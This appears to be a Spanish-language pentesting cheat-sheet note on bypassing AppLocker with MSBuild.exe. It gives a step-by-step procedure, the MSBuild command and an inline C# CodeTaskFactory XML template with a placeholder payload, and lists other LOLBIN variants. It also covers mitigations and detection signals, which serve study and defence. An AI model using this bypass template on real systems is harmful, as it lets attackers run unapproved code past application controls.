---
topic: AppLocker — bypass con MSBuild
tags: [windows, applocker, msbuild, lolbin, execution, bypass]
---

# AppLocker — bypass con MSBuild

[🌐 English](applocker-msbuild-bypass.en.md) | **Español**

## Concepto

AppLocker puede bloquear `.exe` descargados y dejar pasar binarios de confianza de Windows. `MSBuild.exe` es un LOLBIN firmado que compila y ejecuta tareas definidas en un XML. Una tarea `UsingTask` con `TaskFactory="CodeTaskFactory"` ejecuta C# en memoria, sin dejar un ejecutable en disco.

## Cuándo aplica

- AppLocker bloquea la ejecución de binarios en rutas de usuario.
- `MSBuild.exe` está permitido (regla por defecto o de publisher).
- El usuario puede escribir un XML y ejecutarlo.

## Procedimiento

1. Enumerar las reglas y confirmar qué binarios se pueden ejecutar.
2. Generar el payload en C# (por ejemplo, shellcode en un array).
3. Crear el XML con la tarea `CodeTaskFactory`.
4. Ejecutar `MSBuild.exe` sobre el XML.
5. Recibir la conexión en el listener.

## Comandos

```powershell
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe sc.xml
```

```xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Build">
    <UsingTask TaskName="X" TaskFactory="CodeTaskFactory"
      AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
      <Task><Code Type="Class" Language="cs"><![CDATA[
        public class X : Microsoft.Build.Utilities.Task {
          public override bool Execute() { /* payload */ return true; }
        }
      ]]></Code></Task>
    </UsingTask>
    <X />
  </Target>
</Project>
```

## Variantes

- `InstallUtil.exe` con un ensamblado .NET.
- `RegAsm.exe` o `RegSvcs.exe`.
- Ejecutables sin extensión `.exe`.
- `mshta`, `rundll32` o `wmic` si las reglas lo permiten.

## Limitaciones

- AppLocker con reglas de publisher estrictas puede bloquear MSBuild.
- La versión del framework debe existir en el host.
- El XML debe ser válido y la tarea compilar.
- WDAC o ETW pueden detectar la ejecución.

## Mitigación

- Reglas de AppLocker por publisher y hash, no solo por ruta.
- Bloquear MSBuild para usuarios que no desarrollan.
- WDAC en modo auditoría primero y luego aplicado.
- Habilitar Script Block Logging y AMSI.

## Detección

- `MSBuild.exe` con XML fuera de rutas de build.
- Creación de procesos hijos desde MSBuild.
- Eventos 4688 con líneas de comando sospechosas.
- Conexiones salientes desde un proceso de compilación.

## Referencias

- [Microsoft — AppLocker](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/applocker-overview)
- [LOLBAS — MSBuild](https://lolbas-project.github.io/lolbas/Binaries/Msbuild/)
- [0xdf — Fighter](https://0xdf.gitlab.io/2022/04/25/htb-fighter.html)
